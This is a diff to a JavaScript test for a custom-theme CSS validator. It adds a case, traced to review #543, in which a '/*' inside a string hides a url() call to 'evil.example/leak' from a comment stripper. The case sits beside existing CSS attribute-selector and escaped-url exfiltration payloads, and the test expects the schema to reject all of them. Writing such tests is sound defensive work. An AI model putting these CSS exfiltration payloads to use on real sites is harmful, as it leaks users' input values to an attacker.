@@ -51,6 +51,8 @@ describe('custom theme boundary', () => {
       'body{background:u\\72l(https://example.com)}',
       '[value^="a"]{background:url(/leak?a)}',
       'body{background:url("asset:missing.png")}',
+      // Review of #543: a "/*" inside a string hid the real rule from a comment stripper.
+      'p{content:"/*"} body{--z: ; background: var(--z) url(https://evil.example/leak)} p{content:"*/"}',
     ])
       expect(customThemeSchema.safeParse({ ...neonThemeExample, assets, css }).success, css).toBe(
         false,
